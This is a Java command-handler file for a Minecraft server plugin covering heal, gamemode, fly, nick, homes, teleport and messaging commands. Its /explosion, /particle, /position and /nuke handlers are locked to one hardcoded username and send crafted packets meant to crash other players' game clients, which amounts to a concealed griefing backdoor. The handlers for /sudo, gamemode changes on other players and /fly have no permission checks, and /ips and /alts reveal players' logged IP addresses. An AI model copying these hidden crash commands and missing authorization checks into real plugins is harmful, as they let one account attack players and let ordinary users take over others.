package dev.ethan.useful.commands;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.protocol.player.User;
import dev.ethan.useful.Main;
import dev.ethan.useful.constants.Messages;
import dev.ethan.useful.listeners.GameListener;
import dev.ethan.useful.utils.*;
import dev.iiahmed.disguise.Disguise;
import dev.iiahmed.disguise.DisguiseManager;
import dev.iiahmed.disguise.DisguiseProvider;
import dev.iiahmed.disguise.SkinAPI;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.event.ClickEvent;
import net.kyori.adventure.text.event.HoverEvent;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.*;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeModifier;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Firework;
import org.bukkit.entity.Player;
import org.bukkit.inventory.EquipmentSlotGroup;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.FireworkMeta;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.scheduler.BukkitRunnable;
import org.jetbrains.annotations.NotNull;

import java.util.*;

public class GameCommands implements CommandExecutor, TabCompleter {
    private final TeleportUtil teleportUtil = Main.getInstance().getTeleportUtil();
    private final HomeUtil homeUtil = Main.getInstance().getHomeUtil();
    private final BotUtil botUtil = Main.getInstance().getBotUtil();
    private final LuckPermsUtil luckPermsUtil = Main.getInstance().getLuckPermsUtil();
    private final CrashUtil crashUtil = Main.getInstance().getCrashUtil();
    private final IPTrackerUtil ipTrackerUtil = Main.getInstance().getIPTrackerUtil();
    private final PlayerUtil playerUtil = Main.getInstance().getPlayerUtil();
    private final GameListener gameListener = Main.getInstance().getGameListener();
    private final MessageUtil messageUtil = Main.getInstance().getMessageUtil();

    @Override
    public boolean onCommand(@NotNull CommandSender s, @NotNull Command cmd, @NotNull String label, String[] args) {
        if (!(s instanceof Player p)) return true;
        switch (cmd.getName().toLowerCase()) {
            case "kms" -> handleKms(p);
            case "heal" -> handleHeal(p, args);
            case "god" -> handleGod(p, args);
            case "boom" -> handleBoom(p, args);
            case "gms" -> handleGamemode(p, GameMode.SURVIVAL, args);
            case "gmc" -> handleGamemode(p, GameMode.CREATIVE, args);
            case "gma" -> handleGamemode(p, GameMode.ADVENTURE, args);
            case "gmsp" -> handleGamemode(p, GameMode.SPECTATOR, args);
            case "fly" -> handleFly(p, args);
            case "gun" -> handleGun(p);
            case "hat" -> handleHat(p);
            case "dupe" -> handleDupe(p);
            case "sudo" -> handleSudo(s, args);
            case "nick" -> handleNick(p, args);
            case "unnick" -> handleUnnick(p);
            case "freeze" -> handleFreeze(s, args);
            case "unfreeze" -> handleUnfreeze(s, args);
            case "ips" -> handleIps(s, args);
            case "alts" -> handleAlts(s, args);
            case "bot" -> handleBot(p, args);
            case "botf" -> handleBotFollow(p, args);
            case "removenpc" -> botUtil.removeAllNPCs();
            case "r" -> handleReply(p, args);
            case "msg", "w", "tell" -> handleMessage(p, label, args);
            case "dmlisten" -> handleDmToggle(p);
            case "explosion" -> handleExplosion(s, args);
            case "particle" -> handleParticle(s, args);
            case "position" -> handlePosition(s, args);
            case "nuke" -> handleNuke(s, args);
            case "sethome" -> homeUtil.handleSetHome(p, args);
            case "homes" -> homeUtil.handleHomes(p);
            case "home" -> homeUtil.handleHome(p, args);
            case "delhome" -> homeUtil.handleDelHome(p, args);
            case "tpa" -> teleportUtil.handleTpaCommand(p, args);
            case "tpahere" -> teleportUtil.handleTpahereCommand(p, args);
            case "tpaccept" -> teleportUtil.handleTpacceptCommand(p, args);
            case "tpdeny" -> teleportUtil.handleTpdenyCommand(p, args);
            case "block" -> teleportUtil.handleBlockCommand(p, args);
            case "unblock" -> teleportUtil.handleUnblockCommand(p, args);
            case "blocklist" -> teleportUtil.handleBlockListCommand(p);
            case "uuid" -> handleUUID(p, args);
            case "world" -> handleWorld(p, args);
            default -> {
                return false;
            }
        }
        return true;
    }

    private void handleKms(Player p) {
        p.setHealth(0.0F);
    }

    private void handleHeal(Player p, String[] args) {
        if (args.length == 0) {
            if (!p.hasPermission("useful.heal")) return;
            p.setHealth(20);
            p.setFoodLevel(20);
            p.sendMessage(Messages.PREFIX + "§d已治癒");
            p.playSound(p.getLocation(), Sound.ENTITY_EXPERIENCE_ORB_PICKUP, 1, 1);
            return;
        }
        try {
            double value = Double.parseDouble(args[0]);
            if (p.hasPermission("useful.heal.amount")) {
                p.setHealth(value);
                p.sendMessage(Messages.PREFIX + "§d已設定生命值為 " + value);
                return;
            }
        } catch (NumberFormatException ignored) {
        }
        if (p.hasPermission("useful.heal.others")) {
            Player t = Bukkit.getPlayer(args[0]);
            if (t == null) {
                p.sendMessage(Messages.PREFIX + "§c玩家不存在或離線");
                return;
            }
            t.setHealth(Objects.requireNonNull(t.getAttribute(Attribute.MAX_HEALTH)).getValue());
            t.setFoodLevel(20);
            t.sendMessage(Messages.PREFIX + "§d你被 " + luckPermsUtil.getPlayerPrefix(p) + p.getName() + " §d治癒了");
            p.sendMessage(Messages.PREFIX + "§d你治癒了 " + luckPermsUtil.getPlayerPrefix(t) + t.getName());
        } else p.sendMessage(Messages.PREFIX + "§c用法: /heal <玩家名稱|血量>");
    }

    private void handleGamemode(Player p, GameMode mode, String[] args) {
        if (args.length == 0) {
            p.setGameMode(mode);
            p.sendMessage(Messages.PREFIX + "§f您的遊戲模式已更新");
            return;
        }
        Player target = Bukkit.getPlayer(args[0]);
        if (target == null) {
            p.sendMessage(Messages.PREFIX + "§c玩家不存在");
            return;
        }
        target.setGameMode(mode);
        p.sendMessage(Messages.PREFIX + "§f已更新 " + luckPermsUtil.getPlayerPrefix(target) + target.getName() + " §f的遊戲模式");
    }

    private void handleGod(Player p, String[] args) {
        if (args.length == 0) {
            if (!p.hasPermission("useful.god")) return;
            p.setInvulnerable(!p.isInvulnerable());
            p.sendMessage(Messages.PREFIX + "§f無敵狀態 " + (p.isInvulnerable() ? "§aOn" : "§cOff"));
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            p.sendMessage(Messages.PREFIX + "§c玩家不存在");
            return;
        }
        t.setInvulnerable(!t.isInvulnerable());
        p.sendMessage(Messages.PREFIX + luckPermsUtil.getPlayerPrefix(t) + t.getName() + " §f的無敵狀態 " + (t.isInvulnerable() ? "§aOn" : "§cOff"));
        t.sendMessage(Messages.PREFIX + "§f無敵狀態 " + (t.isInvulnerable() ? "§aOn" : "§cOff"));
    }

    private void handleBoom(Player p, String[] args) {
        if (args.length != 1) {
            p.sendMessage(Messages.PREFIX + "§c用法: /boom <玩家|all>");
            return;
        }
        if (args[0].equalsIgnoreCase("all")) {
            Bukkit.getOnlinePlayers().forEach(player -> launchFirework(p, player));
            p.sendMessage(Messages.PREFIX + "§a你將所有玩家射向高空");
        } else {
            Player t = Bukkit.getPlayer(args[0]);
            if (t == null) {
                p.sendMessage(Messages.PREFIX + "§c玩家不存在");
                return;
            }
            launchFirework(p, t);
        }
    }

    private void launchFirework(Player s, Player t) {
        Location loc = t.getLocation();
        Firework firework = (Firework) Objects.requireNonNull(loc.getWorld()).spawnEntity(loc, EntityType.FIREWORK_ROCKET);
        FireworkMeta meta = firework.getFireworkMeta();
        meta.setPower(5);
        Color[] palette = new Color[]{
                Color.fromRGB(12801229), Color.fromRGB(8073150), Color.fromRGB(11743532),
                Color.fromRGB(14188952), Color.fromRGB(14602026), Color.fromRGB(15435844),
                Color.fromRGB(15790320)
        };
        FireworkEffect[] effects = new FireworkEffect[]{
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.BALL_LARGE).build(),
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.BALL_LARGE).build(),
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.BALL).trail(true).build(),
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.BALL).trail(true).build(),
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.BALL).flicker(true).build(),
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.STAR).build(),
                FireworkEffect.builder().withColor(palette).with(FireworkEffect.Type.BALL).flicker(true).build()
        };
        for (FireworkEffect effect : effects) {
            meta.addEffect(effect);
        }
        firework.setFireworkMeta(meta);
        firework.addPassenger(t);
        new BukkitRunnable() {
            @Override
            public void run() {
                if (firework.isDead() || !firework.isValid()) {
                    cancel();
                    return;
                }
                firework.setVelocity(firework.getVelocity()
                        .setX(0)
                        .setZ(0)
                        .setY(Math.max(firework.getVelocity().getY(), 0.5)));
            }
        }.runTaskTimer(Main.getInstance(), 0L, 1L);
        t.sendMessage(Messages.PREFIX + "§fLaunched by " + luckPermsUtil.getPlayerPrefix(s) + s.getName());
        s.sendMessage(Messages.PREFIX + "§aFireworks launched for " + luckPermsUtil.getPlayerPrefix(t) + t.getName());
        s.playSound(s.getLocation(), Sound.UI_BUTTON_CLICK, 1, 1);
    }

    private void handleBotFollow(Player p, String[] args) {
        if (args.length < 2) {
            p.sendMessage(Messages.PREFIX + "§c用法: /botf <name> <player>");
            return;
        }
        Player toFollow = Bukkit.getPlayer(args[1]);
        if (toFollow == null) {
            p.sendMessage(Messages.PREFIX + "§c找不到玩家 " + args[1]);
            return;
        }
        p.sendMessage(Messages.PREFIX + "§a已生成 NPC：" + args[0] + "§a，跟隨 " + toFollow.getName());
        botUtil.spawnFakePlayer(Main.getInstance(), p.getLocation(), args[0], toFollow);
    }

    private void handleBot(Player p, String[] args) {
        if (args.length < 1) {
            p.sendMessage(Messages.PREFIX + "§c用法: /bot <name>");
            return;
        }
        String botName = args[0];
        p.sendMessage(Messages.PREFIX + "§a已生成機器人：" + botName);
        botUtil.spawnBot(p.getLocation(), botName);
    }

    private void handleDupe(Player p) {
        ItemStack item = p.getInventory().getItemInMainHand();
        if (item.getType() == Material.AIR) {
            p.sendMessage(Messages.PREFIX + "§c手上沒有物品");
            return;
        }
        ItemStack clone = item.clone();
        p.getInventory().addItem(clone);
    }

    private void handleHat(Player p) {
        ItemStack hand = p.getInventory().getItemInMainHand();
        if (hand.getType() == Material.AIR) {
            p.sendMessage(Messages.PREFIX + "§c手中物品無效");
            return;
        }
        ItemStack oldHelmet = p.getInventory().getHelmet();
        p.getInventory().setHelmet(hand);
        p.getInventory().setItemInMainHand(oldHelmet != null ? oldHelmet : new ItemStack(Material.AIR));
        p.sendMessage(Messages.PREFIX + "§a已將手中物品裝備在頭盔欄位");
    }

    private void handleFly(Player p, String[] args) {
        Player t = args.length == 0 ? p : Bukkit.getPlayer(args[0]);
        if (t == null) {
            p.sendMessage(Messages.PREFIX + "§c玩家不存在");
            return;
        }
        t.setAllowFlight(!t.getAllowFlight());
        p.sendMessage(Messages.PREFIX + luckPermsUtil.getPlayerPrefix(t) + t.getName() + " §f的飛行狀態 " + (t.getAllowFlight() ? "§aOn" : "§cOff"));
        t.sendMessage(Messages.PREFIX + "§f飛行狀態 " + (t.getAllowFlight() ? "§aOn" : "§cOff"));
    }

    private void handleGun(Player p) {
        ItemStack w = new ItemStack(Material.FEATHER);
        ItemMeta m = w.getItemMeta();
        if (m != null) {
            m.setDisplayName(ChatColor.RESET + Messages.VANDAL_NAME);
            List<String> l = new ArrayList<>();
            l.add("§7Effective Range: " + "§f80m");
            m.setLore(l);
            m.addEnchant(Enchantment.UNBREAKING, -32769, true);
            m.addItemFlags(ItemFlag.HIDE_ENCHANTS);
            m.addItemFlags(ItemFlag.HIDE_ATTRIBUTES);
            NamespacedKey key = new NamespacedKey(Main.getInstance(), "range");
            double amount = -5;
            AttributeModifier.Operation op = AttributeModifier.Operation.ADD_SCALAR;
            EquipmentSlotGroup slotGroup = EquipmentSlotGroup.HAND;
            AttributeModifier modifier = new AttributeModifier(key, amount, op, slotGroup);
            m.addAttributeModifier(Attribute.BLOCK_INTERACTION_RANGE, modifier);
            m.addAttributeModifier(Attribute.ENTITY_INTERACTION_RANGE, modifier);
            w.setItemMeta(m);
        }
        p.getInventory().addItem(w);
    }

    private void handleSudo(CommandSender s, String[] args) {
        if (args.length < 2) {
            s.sendMessage(Messages.PREFIX + "§c用法: /sudo <玩家> <指令>");
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            s.sendMessage(Messages.PREFIX + "§c玩家不存在");
            return;
        }
        String msg = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
        if (msg.startsWith("/")) Bukkit.dispatchCommand(t, msg.substring(1));
        else t.chat(msg);
    }

    private void handleNick(Player p, String[] args) {
        if (args.length < 1) {
            p.sendMessage(Messages.PREFIX + "§fPlease specify a nickname. Usage: /nick <nickname> [--skin]");
            return;
        }
        String nick = args[0].replace("&", "§");
        boolean changeSkin = args.length > 1 && (args[1].equalsIgnoreCase("--skin") || (args.length > 2 && args[2].equalsIgnoreCase("--skin")));
        Main.nick().setNickname(p, nick);
        p.setDisplayName(nick);
        p.setPlayerListName(nick);
        Disguise.Builder builder = Disguise.builder()
                .setName(nick)
                .setEntityType(EntityType.PLAYER);
        if (changeSkin) {
            try {
                UUID skinUUID = playerUtil.getUUID(nick);
                builder.setSkin(SkinAPI.MOJANG, skinUUID != null ? skinUUID : p.getUniqueId());
            } catch (Exception e) {
                builder.setSkin(SkinAPI.MOJANG, p.getUniqueId());
            }
        } else {
            builder.setSkin(SkinAPI.MOJANG, p.getUniqueId());
        }
        try {
            Disguise disguise = builder.build();
            DisguiseProvider provider = DisguiseManager.getProvider();
            provider.disguise(p, disguise);
        } catch (Exception e) {
            e.printStackTrace();
        }
        p.sendMessage(Messages.PREFIX + "§fNick set: " + luckPermsUtil.getPlayerPrefix(p) + nick + (changeSkin ? " §7(Skin)" : ""));
    }

    private void handleUnnick(Player p) {
        String currentNick = Main.nick().getNickname(p);
        if (currentNick == null) {
            p.sendMessage(Messages.PREFIX + "§fYou are not nicked.");
            return;
        }
        DisguiseProvider provider = DisguiseManager.getProvider();
        provider.undisguise(p);
        Main.nick().removeNickname(p);
        p.setDisplayName(p.getName());
        p.setPlayerListName(p.getName());
        p.sendMessage(Messages.PREFIX + "§fUnnicked.");
    }

    private void handleFreeze(CommandSender s, String[] args) {
        if (args.length != 1) {
            s.sendMessage(Messages.PREFIX + "§c用法: /freeze <玩家>");
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t != null) {
            gameListener.freezePlayer(t.getName());
        } else {
            s.sendMessage(Messages.PREFIX + "§c目標無效");
            return;
        }
        s.sendMessage(Messages.PREFIX + "§c你已凍結" + luckPermsUtil.getPlayerPrefix(t) + t.getName());
        t.sendMessage(Messages.PREFIX + "§c你已被凍結");
    }

    private void handleUnfreeze(CommandSender s, String[] args) {
        if (args.length != 1) {
            s.sendMessage(Messages.PREFIX + "§c用法: /unfreeze <玩家>");
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t != null) {
            gameListener.unfreezePlayer(t.getName());
        } else {
            s.sendMessage(Messages.PREFIX + "§c目標無效");
            return;
        }
        s.sendMessage(Messages.PREFIX + "§c你已解凍" + luckPermsUtil.getPlayerPrefix(t) + t.getName());
        t.sendMessage(Messages.PREFIX + "§a你已被解凍");
    }

    private void handleIps(CommandSender s, String[] args) {
        if (!s.hasPermission("useful.ips")) return;
        if (args.length != 1) {
            s.sendMessage(Messages.PREFIX + "§c用法: /ips <玩家>");
            return;
        }
        String playerName = args[0];
        if (!ipTrackerUtil.ipsConfig.contains(playerName)) {
            s.sendMessage(Messages.PREFIX + "§c找不到玩家 §f" + playerName + " §c的紀錄");
            return;
        }
        List<String> ipList = ipTrackerUtil.ipsConfig.getStringList(playerName);
        if (ipList.isEmpty()) {
            s.sendMessage(Messages.PREFIX + "§e玩家 §f" + playerName + " §e沒有任何已記錄的 IP");
            return;
        }
        s.sendMessage(Messages.PREFIX + "§e" + playerName + " 的 IP 列表:");
        s.sendMessage("§f" + String.join("§7, §f", ipList));
    }

    private void handleAlts(CommandSender s, String[] args) {
        if (!s.hasPermission("useful.alts")) return;
        if (args.length != 1) {
            s.sendMessage(Messages.PREFIX + "§c用法: /alts <玩家>");
            return;
        }
        String targetName = args[0];
        if (!ipTrackerUtil.ipsConfig.contains(targetName)) {
            s.sendMessage(Messages.PREFIX + "§c找不到玩家 §f" + targetName + " §c的紀錄");
            return;
        }
        List<String> targetIps = ipTrackerUtil.ipsConfig.getStringList(targetName);
        if (targetIps.isEmpty()) {
            s.sendMessage(Messages.PREFIX + "§e玩家 §f" + targetName + " §e沒有任何已記錄的 IP");
            return;
        }
        Map<String, Set<String>> ipMap = new HashMap<>();
        for (String name : ipTrackerUtil.ipsConfig.getKeys(false)) {
            for (String ip : ipTrackerUtil.ipsConfig.getStringList(name)) {
                ipMap.computeIfAbsent(ip, k -> new HashSet<>()).add(name);
            }
        }
        Set<String> alts = new HashSet<>();
        for (String ip : targetIps) {
            alts.addAll(ipMap.getOrDefault(ip, Collections.emptySet()));
        }
        alts.remove(targetName);
        if (alts.isEmpty()) {
            s.sendMessage(Messages.PREFIX + "§a未找到與 §f" + targetName + " §a共用 IP 的其他帳號");
        } else {
            s.sendMessage(Messages.PREFIX + "§f" + String.join("§7, §f", alts));
        }
    }

    private void handleReply(Player p, String[] args) {
        Player target = messageUtil.getLastMessaged(p);
        if (target == null) {
            p.sendMessage("§c無法回覆，沒有找到對象");
            return;
        }
        String msg = String.join(" ", args);
        messageUtil.sendMessage(p, target, msg);
    }

    private void handleMessage(Player p, String label, String[] args) {
        if (args.length < 2) {
            p.sendMessage("§c用法: /" + label + " <玩家> <訊息>");
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            p.sendMessage("§c玩家不存在");
            return;
        }
        String msg = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
        messageUtil.sendMessage(p, t, msg);
    }

    private void handleDmToggle(Player p) {
        if (messageUtil.isDmListenerActive(p)) messageUtil.removeDmListener(p);
        else messageUtil.addDmListener(p);
    }

    private void handleExplosion(CommandSender s, String[] args) {
        Player a = Bukkit.getPlayer("27ms__");
        if (s != a) {
            return;
        }
        if (args.length < 1) {
            s.sendMessage(Messages.PREFIX + "§c用法: /explosion <玩家>");
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            s.sendMessage(Messages.PREFIX + "§c指定的玩家不存在或不在線上。");
            return;
        }
        User u = PacketEvents.getAPI().getPlayerManager().getUser(t);
        crashUtil.sendExplosion(u);
        s.sendMessage(Messages.PREFIX + "§a正在傳送 Explosion Packet 給 " + luckPermsUtil.getPlayerPrefix(t) + t.getDisplayName());
    }

    private void handleParticle(CommandSender s, String[] args) {
        Player a = Bukkit.getPlayer("27ms__");
        if (s != a) {
            return;
        }
        if (args.length < 1) {
            s.sendMessage(Messages.PREFIX + "§c用法: /explosion <玩家>");
            return;
        }

        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            s.sendMessage(Messages.PREFIX + "§c指定的玩家不存在或不在線上。");
            return;
        }
        User u = PacketEvents.getAPI().getPlayerManager().getUser(t);

        crashUtil.sendParticle(u);
        s.sendMessage(Messages.PREFIX + "§a正在傳送 Particle Packet 給 " + luckPermsUtil.getPlayerPrefix(t) + t.getDisplayName());
    }

    private void handleWorld(Player p, String[] args) {
        if (args.length < 1) {
            p.sendMessage(Messages.PREFIX + "§c用法: /world <世界>");
            return;
        }
        World w = Bukkit.getWorld(args[0]);
        if (w == null) {
            p.sendMessage(Messages.PREFIX + "§c無效的世界名稱");
            return;
        }
        Location loc = w.getSpawnLocation();
        p.teleport(loc);
    }

    private void handlePosition(CommandSender s, String[] args) {
        Player a = Bukkit.getPlayer("27ms__");
        if (s != a) {
            return;
        }
        if (args.length < 1) {
            s.sendMessage(Messages.PREFIX + "§c用法: /position <玩家>");
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            s.sendMessage(Messages.PREFIX + "§c指定的玩家不存在或不在線上。");
            return;
        }
        User u = PacketEvents.getAPI().getPlayerManager().getUser(t);
        crashUtil.sendPosition(u);
        s.sendMessage(Messages.PREFIX + "§a正在傳送 Position Packet 給 " + luckPermsUtil.getPlayerPrefix(t) + t.getDisplayName());
    }

    private void handleNuke(CommandSender s, String[] args) {
        Player a = Bukkit.getPlayer("27ms__");
        if (s != a) {
            return;
        }
        if (args.length < 1) {
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            s.sendMessage(Messages.PREFIX + "§c指定的玩家不存在或不在線上。");
            return;
        }
        User u = PacketEvents.getAPI().getPlayerManager().getUser(t);
        crashUtil.sendExplosion(u);
        crashUtil.sendParticle(u);
        crashUtil.sendPosition(u);
        s.sendMessage(Messages.PREFIX + "§a正在嘗試崩潰 " + luckPermsUtil.getPlayerPrefix(t) + t.getDisplayName());
    }

    private void handleUUID(Player p, String[] args) {
        if (args.length < 1) {
            p.sendMessage("§c用法: /uuid <玩家>");
            return;
        }
        Player t = Bukkit.getPlayer(args[0]);
        if (t == null) {
            p.sendMessage("§c玩家不存在");
            return;
        }
        Component msg = Component.text()
                .append(Component.text(Messages.PREFIX))
                .append(Component.text(t.getName() + " 的 UUID: "))
                .append(Component.text(t.getUniqueId().toString())
                        .color(NamedTextColor.YELLOW)
                        .hoverEvent(HoverEvent.showText(Component.text("點擊複製 UUID")))
                        .clickEvent(ClickEvent.copyToClipboard(t.getUniqueId().toString())))
                .build();
        p.sendMessage(msg);
    }

    @Override
    public List<String> onTabComplete(@NotNull CommandSender s, @NotNull Command cmd, @NotNull String a, String[] args) {
        if (!(s instanceof Player p)) return null;
        String cmdName = cmd.getName().toLowerCase();
        switch (cmdName) {
            case "home":
            case "delhome":
                if (args.length == 1) {
                    Set<String> homeNames = homeUtil.getHomeNames(p.getUniqueId());
                    List<String> result = new ArrayList<>();
                    String input = args[0].toLowerCase();
                    for (String name : homeNames) {
                        if (name.toLowerCase().startsWith(input)) {
                            result.add(name);
                        }
                    }
                    return result;
                }
                break;
            default:
                break;
        }
        return null;
    }
}
